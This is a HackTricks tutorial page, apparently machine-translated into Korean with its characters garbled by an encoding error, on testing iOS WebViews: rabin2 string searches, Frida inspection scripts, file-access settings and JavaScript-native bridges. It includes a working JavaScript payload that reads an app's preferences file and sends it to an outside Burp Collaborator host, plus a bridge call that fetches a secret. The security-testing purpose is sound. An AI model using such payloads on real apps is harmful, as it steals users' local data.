# iOS ì›¹ë·°

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

ì´ í˜ì´ì§€ì˜ ì½”ë“œëŠ” [ì—¬ê¸°](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)ì—ì„œ ì¶”ì¶œë˜ì—ˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ í•´ë‹¹ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”.


## ì›¹ë·° ìœ í˜•

ì›¹ë·°ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì—ì„œ ì›¹ ì½˜í…ì¸ ë¥¼ ëŒ€í™”ì‹ìœ¼ë¡œ í‘œì‹œí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì—ëŠ” ë‹¤ì–‘í•œ ìœ í˜•ì˜ ì›¹ë·°ê°€ ìˆìœ¼ë©° ë‹¤ë¥¸ ê¸°ëŠ¥ê³¼ ë³´ì•ˆ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ê°„ë‹¨í•œ ê°œìš”ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- **UIWebView**ëŠ” iOS 12 ì´í›„ì— ê¶Œì¥ë˜ì§€ ì•Šìœ¼ë©° **JavaScript**ë¥¼ ë¹„í™œì„±í™”í•  ìˆ˜ ì—†ì–´ ìŠ¤í¬ë¦½íŠ¸ ì£¼ì… ë° **Cross-Site Scripting (XSS)** ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤.

- **WKWebView**ëŠ” ì•±ì— ì›¹ ì½˜í…ì¸ ë¥¼ í†µí•©í•˜ëŠ” ìš°ì„ ì ì¸ ì˜µì…˜ìœ¼ë¡œ, ì½˜í…ì¸ ì™€ ë³´ì•ˆ ê¸°ëŠ¥ì— ëŒ€í•œ í–¥ìƒëœ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. **JavaScript**ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í™œì„±í™”ë˜ì–´ ìˆì§€ë§Œ í•„ìš”í•œ ê²½ìš° ë¹„í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ìë°”ìŠ¤í¬ë¦½íŠ¸ê°€ ìë™ìœ¼ë¡œ ì°½ì„ ì—´ì§€ ì•Šë„ë¡í•˜ëŠ” ê¸°ëŠ¥ì„ ì§€ì›í•˜ë©° ëª¨ë“  ì½˜í…ì¸ ê°€ ì•ˆì „í•˜ê²Œ ë¡œë“œë˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ë˜í•œ **WKWebView**ì˜ ì•„í‚¤í…ì²˜ëŠ” ì£¼ìš” ì•± í”„ë¡œì„¸ìŠ¤ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ë©”ëª¨ë¦¬ ì†ìƒ ìœ„í—˜ì„ ìµœì†Œí™”í•©ë‹ˆë‹¤.

- **SFSafariViewController**ëŠ” ì•± ë‚´ì—ì„œ í‘œì¤€í™”ëœ ì›¹ ë¸Œë¼ìš°ì§• ê²½í—˜ì„ ì œê³µí•˜ë©°, ì½ê¸° ì „ìš© ì£¼ì†Œ í•„ë“œ, ê³µìœ  ë° íƒìƒ‰ ë²„íŠ¼, Safariì—ì„œ ì½˜í…ì¸ ë¥¼ ì—´ê¸° ìœ„í•œ ì§ì ‘ ë§í¬ë¥¼ í¬í•¨í•œ íŠ¹ì • ë ˆì´ì•„ì›ƒìœ¼ë¡œ ì¸ì‹ë©ë‹ˆë‹¤. **WKWebView**ì™€ ë‹¬ë¦¬ **SFSafariViewController**ì—ì„œëŠ” **JavaScript**ë¥¼ ë¹„í™œì„±í™”í•  ìˆ˜ ì—†ìœ¼ë©°, ì•±ê³¼ Safariê°€ ì¿ í‚¤ì™€ ë°ì´í„°ë¥¼ ê³µìœ í•˜ì—¬ ì‚¬ìš©ìì˜ ê°œì¸ ì •ë³´ë¥¼ ìœ ì§€í•©ë‹ˆë‹¤. App Store ê°€ì´ë“œë¼ì¸ì— ë”°ë¼ ëˆˆì— ì˜ ë„ê²Œ í‘œì‹œë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## ì›¹ë·° êµ¬ì„± íƒìƒ‰ ìš”ì•½

### **ì •ì  ë¶„ì„ ê°œìš”**

**ì›¹ë·°** êµ¬ì„±ì„ ì¡°ì‚¬í•˜ëŠ” ê³¼ì •ì—ì„œ ë‘ ê°€ì§€ ì£¼ìš” ìœ í˜•ì¸ **UIWebView**ì™€ **WKWebView**ì— ì´ˆì ì„ ë§ì¶”ê³  ìˆìŠµë‹ˆë‹¤. ë°”ì´ë„ˆë¦¬ ë‚´ì—ì„œ ì´ëŸ¬í•œ ì›¹ë·°ë¥¼ ì‹ë³„í•˜ê¸° ìœ„í•´ íŠ¹ì • í´ë˜ìŠ¤ ì°¸ì¡°ì™€ ì´ˆê¸°í™” ë©”ì„œë“œë¥¼ ê²€ìƒ‰í•˜ëŠ” ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

- **UIWebView ì‹ë³„**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
ì´ ëª…ë ¹ì€ ì´ì§„ íŒŒì¼ì—ì„œ ê´€ë ¨ëœ í…ìŠ¤íŠ¸ ë¬¸ìì—´ì„ ê²€ìƒ‰í•˜ì—¬ **UIWebView**ì˜ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì°¾ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

- **WKWebView ì‹ë³„**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
ë§ˆì°¬ê°€ì§€ë¡œ, **WKWebView**ì— ëŒ€í•´ì„œëŠ” ì´ ëª…ë ¹ì–´ê°€ í•´ë‹¹ ì‚¬ìš©ë²•ì„ ë‚˜íƒ€ë‚´ëŠ” í…ìŠ¤íŠ¸ ë¬¸ìì—´ì„ ë°”ì´ë„ˆë¦¬ì—ì„œ ê²€ìƒ‰í•©ë‹ˆë‹¤.

ë˜í•œ, **WKWebView**ê°€ ì–´ë–»ê²Œ ì´ˆê¸°í™”ë˜ëŠ”ì§€ ì°¾ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ë©°, ì´ˆê¸°í™”ì™€ ê´€ë ¨ëœ ë©”ì„œë“œ ì‹œê·¸ë‹ˆì²˜ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScript êµ¬ì„± í™•ì¸**

**WKWebView**ì˜ ê²½ìš°, í•„ìš”í•˜ì§€ ì•Šì€ ê²½ìš° JavaScriptë¥¼ ë¹„í™œì„±í™”í•˜ëŠ” ê²ƒì´ ì¢‹ì€ ë°©ë²•ì´ë¼ê³  ê°•ì¡°ë˜ê³  ìˆìŠµë‹ˆë‹¤. ì»´íŒŒì¼ëœ ì´ì§„ íŒŒì¼ì„ ê²€ìƒ‰í•˜ì—¬ `javaScriptEnabled` ì†ì„±ì´ `false`ë¡œ ì„¤ì •ë˜ì–´ JavaScriptê°€ ë¹„í™œì„±í™”ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Only Secure Content Verification (ë³´ì•ˆ ì½˜í…ì¸  í™•ì¸)**

**WKWebView**ëŠ” **UIWebView**ì™€ëŠ” ë‹¬ë¦¬ í˜¼í•©ëœ ì½˜í…ì¸  ë¬¸ì œë¥¼ ì‹ë³„í•˜ëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŠ” `hasOnlySecureContent` ì†ì„±ì„ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  í˜ì´ì§€ ë¦¬ì†ŒìŠ¤ê°€ ì•ˆì „í•œ ì—°ê²°ì„ í†µí•´ ë¡œë“œë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì»´íŒŒì¼ëœ ì´ì§„ íŒŒì¼ì—ì„œì˜ ê²€ìƒ‰ì€ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **ë™ì  ë¶„ì„ í†µì°°ë ¥**

ë™ì  ë¶„ì„ì€ WebView ì¸ìŠ¤í„´ìŠ¤ì™€ í•´ë‹¹ ì†ì„±ì„ ê²€ì‚¬í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. `webviews_inspector.js`ë¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ `UIWebView`, `WKWebView` ë° `SFSafariViewController` ì¸ìŠ¤í„´ìŠ¤ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” URL ë° JavaScript ë° ë³´ì•ˆ ì½˜í…ì¸ ì™€ ê´€ë ¨ëœ ì„¤ì •ê³¼ í•¨ê»˜ ì°¾ì€ ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ì •ë³´ë¥¼ ê¸°ë¡í•©ë‹ˆë‹¤.

í™ ê²€ì‚¬ëŠ” `ObjC.choose()`ë¥¼ ì‚¬ìš©í•˜ì—¬ WebView ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹ë³„í•˜ê³  `javaScriptEnabled` ë° `hasonlysecurecontent` ì†ì„±ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

ë‹¤ìŒê³¼ ê°™ì´ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**ì£¼ìš” ê²°ê³¼**:
- WebViewì˜ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì„±ê³µì ìœ¼ë¡œ ì°¾ê³  ê²€ì‚¬í•©ë‹ˆë‹¤.
- JavaScript í™œì„±í™” ë° ì•ˆì „í•œ ì½˜í…ì¸  ì„¤ì •ì„ í™•ì¸í•©ë‹ˆë‹¤.

ì´ ìš”ì•½ì€ WebView êµ¬ì„±ì„ ì •ì  ë° ë™ì  ì ‘ê·¼ ë°©ì‹ì„ í†µí•´ ë¶„ì„í•˜ëŠ” ë° ê´€ë ¨ëœ ì¤‘ìš”í•œ ë‹¨ê³„ì™€ ëª…ë ¹ì„ ìš”ì•½í•œ ê²ƒìœ¼ë¡œ, JavaScript í™œì„±í™” ë° í˜¼í•© ì½˜í…ì¸  ê°ì§€ì™€ ê°™ì€ ë³´ì•ˆ ê¸°ëŠ¥ì— ì´ˆì ì„ ë§ì¶”ê³  ìˆìŠµë‹ˆë‹¤.

## WebView í”„ë¡œí† ì½œ ì²˜ë¦¬

WebViewì—ì„œ ì½˜í…ì¸ ë¥¼ ì²˜ë¦¬í•˜ëŠ” ê²ƒì€ íŠ¹íˆ `http(s)://`, `file://`, `tel://`ì™€ ê°™ì€ ë‹¤ì–‘í•œ í”„ë¡œí† ì½œì„ ë‹¤ë£° ë•Œ ì¤‘ìš”í•œ ì¸¡ë©´ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ í”„ë¡œí† ì½œì€ ì•± ë‚´ì—ì„œ ì›ê²© ë° ë¡œì»¬ ì½˜í…ì¸ ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ë¡œì»¬ ì½˜í…ì¸ ë¥¼ ë¡œë“œí•  ë•ŒëŠ” ì‚¬ìš©ìê°€ íŒŒì¼ ì´ë¦„ì´ë‚˜ ê²½ë¡œë¥¼ ì¡°ì‘í•˜ê±°ë‚˜ ì½˜í…ì¸  ìì²´ë¥¼ í¸ì§‘í•˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì£¼ì˜ê°€ í•„ìš”í•©ë‹ˆë‹¤.

**WebViews**ëŠ” ì½˜í…ì¸  ë¡œë”©ì„ ìœ„í•´ ë‹¤ì–‘í•œ ë©”ì„œë“œë¥¼ ì œê³µí•©ë‹ˆë‹¤. **UIWebView**ëŠ” í˜„ì¬ ì‚¬ìš©ì´ ì¤‘ë‹¨ëœ ìƒíƒœì´ì§€ë§Œ, `loadHTMLString:baseURL:` ë° `loadData:MIMEType:textEncodingName:baseURL:`ê³¼ ê°™ì€ ë©”ì„œë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë°˜ë©´ **WKWebView**ëŠ” ì›¹ ì½˜í…ì¸ ë¥¼ ìœ„í•´ `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` ë° `loadRequest:`ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë¡œì»¬ íŒŒì¼ì„ ë¡œë“œí•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ `pathForResource:ofType:`, `URLForResource:withExtension:`, `init(contentsOf:encoding:)`ê³¼ ê°™ì€ ë©”ì„œë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. íŠ¹íˆ `loadFileURL:allowingReadAccessToURL:` ë©”ì„œë“œëŠ” WebViewì— íŠ¹ì • URLì´ë‚˜ ë””ë ‰í† ë¦¬ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆìœ¼ë©°, ë””ë ‰í† ë¦¬ê°€ ì§€ì •ëœ ê²½ìš° ë¯¼ê°í•œ ë°ì´í„°ê°€ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ë©”ì„œë“œë¥¼ ì†ŒìŠ¤ ì½”ë“œë‚˜ ì»´íŒŒì¼ëœ ì´ì§„ íŒŒì¼ì—ì„œ ì°¾ìœ¼ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
**íŒŒì¼ ì•¡ì„¸ìŠ¤**ì— ê´€í•´ì„œ, UIWebViewëŠ” ì¼ë°˜ì ìœ¼ë¡œ í—ˆìš©í•˜ì§€ë§Œ, WKWebViewëŠ” ê¸°ë³¸ì ìœ¼ë¡œ `allowFileAccessFromFileURLs`ì™€ `allowUniversalAccessFromFileURLs` ì„¤ì •ì„ ë„ì…í•˜ì—¬ íŒŒì¼ URLë¡œë¶€í„°ì˜ ì•¡ì„¸ìŠ¤ë¥¼ ê´€ë¦¬í•©ë‹ˆë‹¤. ë‘ ì„¤ì • ëª¨ë‘ ê¸°ë³¸ì ìœ¼ë¡œ falseë¡œ ì„¤ì •ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

ë³´ì•ˆ ì„¤ì •ì„ ìœ„í•´ **WKWebView** êµ¬ì„±ì„ ê²€ì‚¬í•˜ëŠ” Frida ìŠ¤í¬ë¦½íŠ¸ ì˜ˆì œê°€ ì œê³µë©ë‹ˆë‹¤:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
ë§ˆì§€ë§‰ìœ¼ë¡œ, ë¡œì»¬ íŒŒì¼ì„ ìœ ì¶œí•˜ê¸° ìœ„í•œ JavaScript í˜ì´ë¡œë“œì˜ ì˜ˆëŠ” ì˜ëª» êµ¬ì„±ëœ WebViewì™€ ê´€ë ¨ëœ ì ì¬ì ì¸ ë³´ì•ˆ ìœ„í—˜ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ì´ í˜ì´ë¡œë“œëŠ” íŒŒì¼ ë‚´ìš©ì„ 16ì§„ìˆ˜ í˜•ì‹ìœ¼ë¡œ ì¸ì½”ë”©í•œ í›„ ì„œë²„ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. ì´ëŠ” WebView êµ¬í˜„ì—ì„œ ì—„ê²©í•œ ë³´ì•ˆ ì¡°ì¹˜ì˜ ì¤‘ìš”ì„±ì„ ê°•ì¡°í•©ë‹ˆë‹¤.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## ì›¹ë·°ë¥¼ í†µí•´ ë…¸ì¶œëœ ë„¤ì´í‹°ë¸Œ ë©”ì„œë“œ

## iOSì—ì„œ ì›¹ë·° ë„¤ì´í‹°ë¸Œ ì¸í„°í˜ì´ìŠ¤ ì´í•´í•˜ê¸°

iOS 7ë¶€í„° Appleì€ **ì›¹ë·° ë‚´ì˜ JavaScriptì™€ ë„¤ì´í‹°ë¸Œ** Swift ë˜ëŠ” Objective-C ê°ì²´ ê°„ì˜ í†µì‹ ì„ ìœ„í•œ APIë¥¼ ì œê³µí–ˆìŠµë‹ˆë‹¤. ì´ í†µí•©ì€ ì£¼ë¡œ ë‘ ê°€ì§€ ë°©ë²•ì„ í†µí•´ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤:

- **JSContext**: Swift ë˜ëŠ” Objective-C ë¸”ë¡ì´ `JSContext` ë‚´ì˜ ì‹ë³„ìì— ì—°ê²°ë  ë•Œ ìë™ìœ¼ë¡œ JavaScript í•¨ìˆ˜ê°€ ìƒì„±ë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ JavaScriptì™€ ë„¤ì´í‹°ë¸Œ ì½”ë“œ ê°„ì˜ ì›í™œí•œ í†µí•©ê³¼ í†µì‹ ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.
- **JSExport í”„ë¡œí† ì½œ**: `JSExport` í”„ë¡œí† ì½œì„ ìƒì†í•¨ìœ¼ë¡œì¨ ë„¤ì´í‹°ë¸Œ ì†ì„±, ì¸ìŠ¤í„´ìŠ¤ ë©”ì„œë“œ ë° í´ë˜ìŠ¤ ë©”ì„œë“œë¥¼ JavaScriptì— ë…¸ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” JavaScript í™˜ê²½ì—ì„œ ìˆ˜í–‰ëœ ë³€ê²½ ì‚¬í•­ì´ ë„¤ì´í‹°ë¸Œ í™˜ê²½ì— ë°˜ì˜ë˜ê³  ê·¸ ë°˜ëŒ€ë„ ê°€ëŠ¥í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ë°©ë²•ì„ í†µí•´ ë¯¼ê°í•œ ë°ì´í„°ê°€ ë¬´ì‹¬ì½” ë…¸ì¶œë˜ì§€ ì•Šë„ë¡ ì£¼ì˜í•´ì•¼ í•©ë‹ˆë‹¤.

### Objective-Cì—ì„œ `JSContext`ì— ì ‘ê·¼í•˜ê¸°

Objective-Cì—ì„œ `UIWebView`ì˜ `JSContext`ëŠ” ë‹¤ìŒ ì½”ë“œë¡œ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### `WKWebView`ê³¼ì˜ í†µì‹ 

`WKWebView`ì—ì„œëŠ” `JSContext`ì— ì§ì ‘ì ì¸ ì ‘ê·¼ì´ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. ëŒ€ì‹ , `postMessage` í•¨ìˆ˜ë¥¼ í†µí•´ ë©”ì‹œì§€ ì „ë‹¬ì´ ì´ë£¨ì–´ì§€ë©°, ì´ë¥¼ í†µí•´ JavaScriptì™€ ë„¤ì´í‹°ë¸Œ ê°„ì˜ í†µì‹ ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤. ì´ëŸ¬í•œ ë©”ì‹œì§€ì— ëŒ€í•œ í•¸ë“¤ëŸ¬ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì„¤ì •ë˜ë©°, ì´ë¥¼ í†µí•´ JavaScriptê°€ ë„¤ì´í‹°ë¸Œ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ì•ˆì „í•˜ê²Œ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### ìƒí˜¸ì‘ìš© ë° í…ŒìŠ¤íŠ¸

JavaScriptëŠ” ìŠ¤í¬ë¦½íŠ¸ ë©”ì‹œì§€ í•¸ë“¤ëŸ¬ë¥¼ ì •ì˜í•¨ìœ¼ë¡œì¨ ë„¤ì´í‹°ë¸Œ ë ˆì´ì–´ì™€ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì›¹í˜ì´ì§€ì—ì„œ ë„¤ì´í‹°ë¸Œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë“±ì˜ ì‘ì—…ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
ë„¤ì´í‹°ë¸Œ í•¨ìˆ˜ í˜¸ì¶œì˜ ê²°ê³¼ë¥¼ ìº¡ì²˜í•˜ê³  ì¡°ì‘í•˜ê¸° ìœ„í•´ HTML ë‚´ì—ì„œ ì½œë°± í•¨ìˆ˜ë¥¼ ì¬ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
ë„¤ì´í‹°ë¸Œ ì¸¡ë©´ì—ì„œëŠ” `JavaScriptBridgeMessageHandler` í´ë˜ìŠ¤ì—ì„œ JavaScript í˜¸ì¶œì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì—¬ê¸°ì„œ ìˆ«ìë¥¼ ê³±í•˜ëŠ” ë“±ì˜ ì‘ì—… ê²°ê³¼ê°€ ì²˜ë¦¬ë˜ê³  JavaScriptë¡œ ë‹¤ì‹œ ì „ì†¡ë˜ì–´ í‘œì‹œë˜ê±°ë‚˜ ì¶”ê°€ ì¡°ì‘ì„ ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## iOS WebViews ë””ë²„ê¹…

([https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)ì˜ íŠœí† ë¦¬ì–¼ì„ ê¸°ë°˜ìœ¼ë¡œ í•œ ììŠµì„œ)

iOS ì›¹ë·° ë‚´ì—ì„œ ì›¹ ì½˜í…ì¸ ë¥¼ íš¨ê³¼ì ìœ¼ë¡œ ë””ë²„ê¹…í•˜ê¸° ìœ„í•´ì„œëŠ” `console.log()`ë¡œ ë³´ë‚¸ ë©”ì‹œì§€ê°€ Xcode ë¡œê·¸ì— í‘œì‹œë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— Safariì˜ ê°œë°œì ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ëŠ” íŠ¹ì • ì„¤ì •ì´ í•„ìš”í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ì£¼ìš” ë‹¨ê³„ì™€ ìš”êµ¬ ì‚¬í•­ì„ ê°•ì¡°í•œ ê°„ì†Œí™”ëœ ê°€ì´ë“œì…ë‹ˆë‹¤.

- **iOS ê¸°ê¸°ì—ì„œì˜ ì¤€ë¹„**: iOS ê¸°ê¸°ì—ì„œ Safari ì›¹ ì¸ìŠ¤í™í„°ë¥¼ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **ì„¤ì • > Safari > ê³ ê¸‰**ìœ¼ë¡œ ì´ë™í•˜ì—¬ _ì›¹ ì¸ìŠ¤í™í„°_ë¥¼ í™œì„±í™”í•©ë‹ˆë‹¤.

